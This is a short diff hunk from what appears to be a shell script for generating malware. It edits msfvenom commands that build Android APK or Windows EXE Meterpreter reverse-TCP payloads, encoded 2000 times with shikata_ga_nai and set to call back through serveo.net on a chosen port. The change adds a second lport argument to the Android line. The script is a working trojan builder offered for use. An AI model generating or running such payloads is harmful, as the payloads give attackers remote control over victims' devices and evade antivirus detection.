@@ -66,7 +66,7 @@ while true; do
 if [ $t -eq 2 ]
  then
  o='android'
-msfvenom -p $o/meterpreter/reverse_tcp lhost=serveo.net -e x86/shikata_ga_nai -i 2000 lport=$p -o /root/Desktop/$n.apk
+msfvenom -p $o/meterpreter/reverse_tcp lhost=serveo.net lport=$p -e x86/shikata_ga_nai -i 2000 lport=$p -o /root/Desktop/$n.apk
 else 
  o='windows'
 msfvenom -p $o/meterpreter/reverse_tcp lhost=serveo.net lport=$p -e x86/shikata_ga_nai -i 2000  -o /root/Desktop/$n.exe
